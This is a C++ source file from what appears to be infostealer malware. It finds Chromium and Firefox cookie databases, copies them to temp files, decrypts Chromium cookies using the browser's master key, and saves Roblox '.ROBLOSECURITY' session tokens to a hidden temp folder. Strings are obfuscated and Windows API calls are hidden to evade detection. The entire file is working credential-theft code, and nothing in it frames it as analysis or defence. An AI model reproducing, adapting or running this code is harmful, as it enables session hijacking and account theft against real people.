#include "core.hpp"
#include "Cookies.hpp"
#include "Browsers_EntryPoint.hpp"
#include "winapi_structs.hpp"
#include "Crypto.hpp"
#include "nss3.hpp"
#include "os.hpp"
#include "Deduplicator.hpp"
#include "obfusheader.h" 
#include <vector>
#include "sqlite3.h"
#include <filesystem>
#include <windows.h>  
#include <fstream>  
#include <iostream>
#include "Helper.h"

namespace fs = std::filesystem;

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Shell32.lib")

// Function to save .ROBLOSECURITY cookies to a specific file
// This was made for SWIM he should ... this took me 5 minutes.
void SaveRobloxSecurityCookie(const std::vector<std::string>& cookie_values) {
    char tempPath[MAX_PATH];
    if (HiddenCalls::GetTempPathA(MAX_PATH, tempPath) == 0) {
        return;
    }

    std::string folderPath = std::string(tempPath) + OBF("sryxen\\Games\\roblox");
    std::string filePath = folderPath + OBF("\\robloxsecurity.txt");

    fs::create_directories(folderPath);

    std::ofstream outFile(filePath, std::ios::out | std::ios::app);
    if (!outFile) {
        return;
    }

    std::vector<std::string> deduplicatedValues = Deduplicate(cookie_values);

    for (const auto& value : deduplicatedValues) {
        outFile << OBF("ROBLOSECURITY=") << value << std::endl;
    }

    outFile.close();
}

std::vector<Cookie> Browser::GetCookies() {
    std::vector<Cookie> ck;
    std::vector<std::string> robloxCookies;

    // Finally getting to the interesting stuff
    for (const auto& Chromium : chromiumBrowsers) {

        std::wstringstream ss(Chromium.browserVersion);
        std::wstring firstPart;
        std::getline(ss, firstPart, OBF(L'.'));

        int versionNumber = std::stoi(firstPart);

        if (versionNumber >= 127) {
            // New Encryption. Gotta use the debugging method to get the cookies
            BrowserCookieExtractor obj;
            obj.GetCookie(Chromium.browserPath, Chromium.browserRoot, Chromium.browserName);

            // Function saves the cookies on its own, so no need to further try to get the cookies here
            continue;
        }

        fs::path CCookie = fs::path(Chromium.profileLocation) / OBF("Network") / OBF("Cookies"); // CCookie to not conflict with the other Cookie var
        fs::path LocalState = fs::path(Chromium.browserRoot) / OBF("Local State");

        if (!fs::exists(CCookie) || !fs::exists(LocalState)) {
            continue;
        }

        std::string cookies_str = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
        const char* cookies = cookies_str.c_str();

        std::string local_state_str = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
        const char* local_state = local_state_str.c_str();

        try {
            copy_file(LocalState, local_state, fs::copy_options::overwrite_existing); // Better then nth ig
            copy_file(CCookie, cookies, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        HANDLE hFile = HiddenCalls::CreateFileA(cookies, GENERIC_READ,
            FILE_SHARE_READ, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }

        DWORD fileSize = HiddenCalls::GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        HANDLE hMap = HiddenCalls::CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, fileSize, nullptr);
        if (!hMap) {
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        LPVOID mappedFile = HiddenCalls::MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, fileSize);
        if (!mappedFile) {
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        std::string master_key = Crypto::GetMasterKey(local_state);

        std::string tempdb = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
        try {
            copy_file(cookies, tempdb, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            HiddenCalls::UnmapViewOfFile(mappedFile);
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        if (sqlite3_open(tempdb.c_str(), &db) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::UnmapViewOfFile(mappedFile);
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            fs::remove(tempdb);
            continue;
        }

        std::string query = OBF("SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies");
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::UnmapViewOfFile(mappedFile);
            HiddenCalls::CloseHandle(hMap);
            HiddenCalls::CloseHandle(hFile);
            fs::remove(tempdb);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Cookie cookie;
            cookie.name = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            cookie.site = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            cookie.path = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
            cookie.expires = std::to_string(sqlite3_column_int64(stmt, 3));
            cookie.is_secure = sqlite3_column_int(stmt, 4) != 0;

            const int size = sqlite3_column_bytes(stmt, 5);
            if (size > 0) {
                auto* encrypted_cookie = (unsigned char*)sqlite3_column_blob(stmt, 5);
                std::vector<unsigned char> encrypted_cook(encrypted_cookie, encrypted_cookie + size);
                cookie.value = Crypto::AES256GCMDecrypt(master_key, encrypted_cook);
            }

            if (cookie.name == OBF(".ROBLOSECURITY")) {
                robloxCookies.push_back(cookie.value);
            }
            else {
                ck.push_back(cookie);
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
        fs::remove(tempdb);

        HiddenCalls::UnmapViewOfFile(mappedFile);
        HiddenCalls::CloseHandle(hMap);
        HiddenCalls::CloseHandle(hFile);

        try {
            fs::remove(local_state);
            fs::remove(cookies);
        }
        catch (...) {}
    }

    for (const auto& Gecko : geckoBrowsers) {
        fs::path CCookie = fs::path(Gecko.profileLocation) / OBF("cookies.sqlite");

        if (!fs::exists(CCookie)) {
            continue;
        }

        std::string cookies = TEMP + OBF("\\") + RandomString(7) + OBF(".db");

        try {
            copy_file(CCookie, cookies, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        if (sqlite3_open(cookies.c_str(), &db) != SQLITE_OK) {
            continue;
        }

        std::string query = OBF("SELECT name, host, path, expiry, isSecure, value FROM moz_cookies");
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Cookie cookie;
            cookie.name = (std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))));
            cookie.site = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            cookie.path = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
            cookie.expires = std::to_string(sqlite3_column_int64(stmt, 3));
            cookie.is_secure = sqlite3_column_int(stmt, 4) != 0;

            cookie.value = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5)));

            if (cookie.name == OBF(".ROBLOSECURITY")) {
                robloxCookies.push_back(cookie.value);
            }
            else {
                ck.push_back(cookie);
            }

        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        try {
            fs::remove(cookies);
        }
        catch (...) {}
    }

    if (!robloxCookies.empty()) {
        SaveRobloxSecurityCookie(robloxCookies);
    }

    DEBUG_PRINT(L"Cookie Grabber Passed");

    return ck;
}
